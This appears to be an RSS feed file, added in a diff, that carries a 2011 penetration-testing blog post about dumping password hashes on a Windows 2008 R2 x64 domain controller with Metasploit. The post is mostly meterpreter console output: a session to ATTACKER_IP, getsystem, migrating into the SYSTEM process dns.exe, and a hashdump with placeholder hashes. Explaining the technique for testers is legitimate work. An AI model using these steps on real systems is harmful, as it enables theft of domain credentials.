@@ -1,0 +1,232 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Hashdump on Room362</title>
+    <link>http://localhost:1313/tags/hashdump/</link>
+    <description>Recent content in Hashdump on Room362</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <copyright>&amp;copy; 2016. All rights reserved.</copyright>
+    <lastBuildDate>Mon, 16 May 2011 02:35:31 +0000</lastBuildDate>
+    <atom:link href="http://localhost:1313/tags/hashdump/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>Dumping Hashes on Win2k8 R2 x64 with Metasploit</title>
+      <link>http://localhost:1313/post/2011/2011515dumping-hashes-on-win2k8-r2-x64-with-metasploit-html/</link>
+      <pubDate>Mon, 16 May 2011 02:35:31 +0000</pubDate>
+      
+      <guid>http://localhost:1313/post/2011/2011515dumping-hashes-on-win2k8-r2-x64-with-metasploit-html/</guid>
+      <description>&lt;p&gt;When trying to dump password hashes on a Windows 2008 R2 64 bit box I constantly run into the &amp;ldquo;The parameter is incorrect&amp;rdquo; error in meterpreter. So I&amp;rsquo;ve had to fall back on dropping binaries which I really don&amp;rsquo;t like doing because of the added clean up and chance of getting &amp;lsquo;caught&amp;rsquo;. Well, with a bit of migration you&amp;rsquo;ll be back to passing the hash. Here is how, with a bit of the thought process first:&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;pre&gt;&lt;code&gt;                ##                          ###           ##    ##
+ ##  ##  #### ###### ####  #####   #####    ##    ####        ######
+####### ##  ##  ##  ##         ## ##  ##    ##   ##  ##   ###   ##
+####### ######  ##  #####   ####  ##  ##    ##   ##  ##   ##    ##
+## # ##     ##  ##  ##  ## ##      #####    ##   ##  ##   ##    ##
+##   ##  #### ###   #####   #####     ##   ####   ####   #### ###
+                                      ##
+
+
+       =[ metasploit v3.7.1-release [core:3.7 api:1.0]
++ -- --=[ 687 exploits - 364 auxiliary - 43 post
++ -- --=[ 217 payloads - 27 encoders - 8 nops
+       =[ svn r12622 updated today (2011.05.15)
+
+msf &amp;gt; 
+[*] DC_IP:49220 Request received for /AYSBk...
+[*] DC_IP:49220 Staging connection for target YSBk received...
+[*] Patching Target ID YSBk into DLL
+[*] DC_IP:49221 Request received for /BYSBk...
+[*] DC_IP:49221 Stage connection for target YSBk received...
+[*] Meterpreter session 7 opened (ATTACKER_IP:443 -&amp;gt; DC_IP:49221) at Sun May 15 21:37:31 +0000 2011
+
+msf &amp;gt; sessions -i 7
+[*] Starting interaction with 7...
+
+meterpreter &amp;gt; sysinfo
+System Language : en_US
+OS              : Windows 2008 R2 (Build 7601, Service Pack 1).
+Computer        : DOMAINCONTROLLE
+Architecture    : x64 (Current Process is WOW64)
+Meterpreter     : x86/win32
+
+meterpreter &amp;gt; ps
+
+Process list
+============
+
+ PID   Name                                       Arch  Session  User                          Path
+ ---   ----                                       ----  -------  ----                          ----
+ 0     [System Process]                                                                        
+ 4     System                                     x64   0                                      
+ 224   smss.exe                                   x64   0        NT AUTHORITYSYSTEM           C:WindowsSystem32smss.exe
+ 324   csrss.exe                                  x64   0        NT AUTHORITYSYSTEM           C:WindowsSystem32csrss.exe
+ 364   csrss.exe                                  x64   1        NT AUTHORITYSYSTEM           C:WindowsSystem32csrss.exe
+ 372   wininit.exe                                x64   0        NT AUTHORITYSYSTEM           C:WindowsSystem32wininit.exe
+ 404   winlogon.exe                               x64   1        NT AUTHORITYSYSTEM           C:WindowsSystem32winlogon.exe
+ 468   services.exe                               x64   0        NT AUTHORITYSYSTEM           C:WindowsSystem32services.exe
+ 476   lsass.exe                                  x64   0        NT AUTHORITYSYSTEM           C:WindowsSystem32lsass.exe
+ 484   lsm.exe                                    x64   0        NT AUTHORITYSYSTEM           C:WindowsSystem32lsm.exe
+ 628   svchost.exe                                x64   0        NT AUTHORITYSYSTEM           C:WindowsSystem32svchost.exe
+ 708   svchost.exe                                x64   0        NT AUTHORITYNETWORK SERVICE  C:WindowsSystem32svchost.exe
+ 804   svchost.exe                                x64   0        NT AUTHORITYLOCAL SERVICE    C:WindowsSystem32svchost.exe
+ 836   svchost.exe                                x64   0        NT AUTHORITYSYSTEM           C:WindowsSystem32svchost.exe
+ 880   svchost.exe                                x64   0        NT AUTHORITYLOCAL SERVICE    C:WindowsSystem32svchost.exe
+ 932   svchost.exe                                x64   0        NT AUTHORITYSYSTEM           C:WindowsSystem32svchost.exe
+ 972   svchost.exe                                x64   0        NT AUTHORITYNETWORK SERVICE  C:WindowsSystem32svchost.exe
+ 328   svchost.exe                                x64   0        NT AUTHORITYLOCAL SERVICE    C:WindowsSystem32svchost.exe
+ 1172  spoolsv.exe                                x64   0        NT AUTHORITYSYSTEM           C:WindowsSystem32spoolsv.exe
+ 1204  Microsoft.ActiveDirectory.WebServices.exe  x64   0        NT AUTHORITYSYSTEM           C:WindowsADWSMicrosoft.ActiveDirectory.WebServices.exe
+ 1252  dfsrs.exe                                  x64   0        NT AUTHORITYSYSTEM           C:WindowsSystem32dfsrs.exe
+ 1288  dns.exe                                    x64   0        NT AUTHORITYSYSTEM           C:WindowsSystem32dns.exe
+ 1316  ismserv.exe                                x64   0        NT AUTHORITYSYSTEM           C:WindowsSystem32ismserv.exe
+ 1360  svchost.exe                                x64   0        NT AUTHORITYLOCAL SERVICE    C:WindowsSystem32svchost.exe
+ 1392  vmtoolsd.exe                               x64   0        NT AUTHORITYSYSTEM           C:Program FilesVMwareVMware Toolsvmtoolsd.exe
+ 1464  wlms.exe                                   x64   0        NT AUTHORITYSYSTEM           C:WindowsSystem32wlmswlms.exe
+ 1492  dfssvc.exe                                 x64   0        NT AUTHORITYSYSTEM           C:WindowsSystem32dfssvc.exe
+ 1572  VMUpgradeHelper.exe                        x64   0        NT AUTHORITYSYSTEM           C:Program FilesVMwareVMware ToolsVMUpgradeHelper.exe
+ 1896  TPAutoConnSvc.exe                          x64   0        NT AUTHORITYSYSTEM           C:Program FilesVMwareVMware ToolsTPAutoConnSvc.exe
+ 2016  vds.exe                                    x64   0        NT AUTHORITYSYSTEM           C:WindowsSystem32vds.exe
+ 872   sppsvc.exe                                 x64   0        NT AUTHORITYNETWORK SERVICE  C:WindowsSystem32sppsvc.exe
+ 1268  WmiPrvSE.exe                               x64   0        NT AUTHORITYSYSTEM           C:WindowsSystem32wbemWmiPrvSE.exe
+ 2360  taskhost.exe                               x64   1        SITTINGDUCKjuser             C:WindowsSystem32taskhost.exe
+ 2424  dwm.exe                                    x64   1        SITTINGDUCKjuser             C:WindowsSystem32dwm.exe
+ 2452  explorer.exe                               x64   1        SITTINGDUCKjuser             C:Windowsexplorer.exe
+ 2504  TPAutoConnect.exe                          x64   1        SITTINGDUCKjuser             C:Program FilesVMwareVMware ToolsTPAutoConnect.exe
+ 2512  conhost.exe                                x64   1        SITTINGDUCKjuser             C:WindowsSystem32conhost.exe
+ 2632  VMwareTray.exe                             x64   1        SITTINGDUCKjuser             C:Program FilesVMwareVMware ToolsVMwareTray.exe
+ 2640  VMwareUser.exe                             x64   1        SITTINGDUCKjuser             C:Program FilesVMwareVMware ToolsVMwareUser.exe
+ 2716  mmc.exe                                    x64   1        SITTINGDUCKjuser             C:WindowsSystem32mmc.exe
+ 3052  mscorsvw.exe                               x86   0        NT AUTHORITYSYSTEM           C:WindowsMicrosoft.NETFrameworkv4.0.30319mscorsvw.exe
+ 2216  TrustedInstaller.exe                       x64   0        NT AUTHORITYSYSTEM           C:WindowsservicingTrustedInstaller.exe
+ 1932  mscorsvw.exe                               x64   0        NT AUTHORITYSYSTEM           C:WindowsMicrosoft.NETFramework64v4.0.30319mscorsvw.exe
+ 2564  svchost.exe                                x64   0        NT AUTHORITYLOCAL SERVICE    C:WindowsSystem32svchost.exe
+ 1732  msdtc.exe                                  x64   0        NT AUTHORITYNETWORK SERVICE  C:WindowsSystem32msdtc.exe
+ 2992  notepad.exe                                x86   1        SITTINGDUCKjuser             C:WindowsSysWOW64notepad.exe
+ 1720  notepad.exe                                x64   1        SITTINGDUCKjuser             C:WindowsSystem32notepad.exe
+
+
+meterpreter &amp;gt; getpid
+Current pid: 2992
+
+meterpreter &amp;gt; hashdump
+[-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Ah, the wonderful &amp;lsquo;The parameter is incorrect&amp;rsquo; error. Ok we are an admin since we can see the user for SYSTEM processes, so that isn&amp;rsquo;t the issue, but lets do a &amp;lsquo;getprivs&amp;rsquo; just in case:&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; getprivs    
+============================================================
+Enabled Process Privileges
+============================================================
+  SeDebugPrivilege
+  SeIncreaseQuotaPrivilege
+  SeMachineAccountPrivilege
+  SeSecurityPrivilege
+  SeTakeOwnershipPrivilege
+  SeLoadDriverPrivilege
+  SeSystemProfilePrivilege
+  SeSystemtimePrivilege
+  SeProfileSingleProcessPrivilege
+  SeIncreaseBasePriorityPrivilege
+  SeCreatePagefilePrivilege
+  SeBackupPrivilege
+  SeRestorePrivilege
+  SeShutdownPrivilege
+  SeSystemEnvironmentPrivilege
+  SeChangeNotifyPrivilege
+  SeRemoteShutdownPrivilege
+  SeUndockPrivilege
+  SeEnableDelegationPrivilege
+  SeManageVolumePrivilege
+
+meterpreter &amp;gt; hashdump
+[-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Boo.. Ok, so maybe we have to be &amp;lsquo;SYSTEM&amp;rsquo;&amp;hellip;&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; getsystem
+...got system (via technique 1).
+
+meterpreter &amp;gt; hashdump
+[-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Still nothing&amp;hellip; Maybe it requires that we be in a 64 bit process&amp;hellip; PID 1720 was 64 bit version of Notepad, lets try that&amp;hellip;&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; migrate 1720
+[*] Migrating to 1720...
+[*] Migration completed successfully.
+
+meterpreter &amp;gt; hashdump
+[-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Damn, what about as &amp;lsquo;SYSTEM&amp;rsquo;&amp;hellip;&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; getsystem ...got system (via technique 1).  
+
+
+
+
+
+
+
+
+
+
+meterpreter &amp;gt; hashdump 
+
+
+
+
+
+
+
+
+
+
+[-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;No joy.. hmmm What about a &amp;lsquo;SYSTEM&amp;rsquo; process that was already there.. &amp;lsquo;dns.exe&amp;rsquo; PID 1288 should be good&amp;hellip;&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; migrate 1288
+[*] Migrating to 1288...
+[*] Migration completed successfully.
+
+meterpreter &amp;gt; hashdump
+Administrator:500:MYLMHASH:MYNTLMHASH:::
+Guest:501:MYLMHASH:MYNTLMHASH:::
+krbtgtG:502:MYLMHASH:MYNTLMHASH:::
+Domain Admin?:1000:MYLMHASH:MYNTLMHASH:::
+juserN:1104:MYLMHASH:MYNTLMHASH:::
+jane.user??:1105:MYLMHASH:MYNTLMHASH:::
+DOMAINCONTROLLE$?:1001:MYLMHASH:MYNTLMHASH:::
+
+meterpreter &amp;gt; 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;w00t. So I don&amp;rsquo;t know why, but it seems that you have to be in a &amp;lsquo;SYSTEM&amp;rsquo; process who&amp;rsquo;s primary token (started by SYSTEM) is SYSTEM (since &amp;lsquo;getsystem&amp;rsquo; wasn&amp;rsquo;t working). I also tried this getting SYSTEM to run a 32 bit process, and was still unable to dump hashes. So next time you&amp;rsquo;re on an Win2k8 R2 64 bit box, remember to migrate into a pre-existing 64bit SYSTEM process and you should be good to go.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Update&lt;/strong&gt; on 2011-05-15 23:39 by Rob Fuller&lt;/p&gt;
+
+&lt;p&gt;As Gavin points out in the comments, it is better to run the meterpreter script or post module to do hashdumping on systems. The only time this is not the case is when you are trying to get domain hashes on a domain controller. The registry does not store these hashes (as far as I know). So LSASS injection is the only route and you have to jump through the mentioned hoops.&lt;/p&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
